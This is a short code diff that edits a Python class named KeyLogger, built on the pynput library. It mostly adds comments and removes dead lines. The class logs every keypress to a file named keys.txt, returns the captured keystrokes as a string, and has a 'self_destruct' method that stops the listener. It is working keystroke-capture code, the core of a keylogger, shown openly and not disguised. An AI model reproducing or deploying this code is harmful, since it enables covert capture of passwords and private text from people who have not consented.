@@ -1,9 +1,8 @@
 from pynput.keyboard import Listener
-#from threading import Timer
 
 class KeyLogger:
-    def __init__(self):
-        pass
+
+    #log a keypress
     def on_press(key):
         k = str(key)
         k = k.replace("'", " ")
@@ -18,16 +17,16 @@ class KeyLogger:
         file.write('\n')
         file.close()
 
+    #start logging keys
     def start(self):
         with Listener(on_press=KeyLogger.on_press) as self.listener:
-            #Timer(5, self.listener.stop).start()
             self.listener.join()
-        
+    
+    #returns keystrokes as a string
     def readkeys(self):
         with open('keys.txt', 'r') as file:
             return file.read().rstrip()
 
+    #stop recording keystrokes
     def self_destruct(self):
         self.listener.stop()
-
-
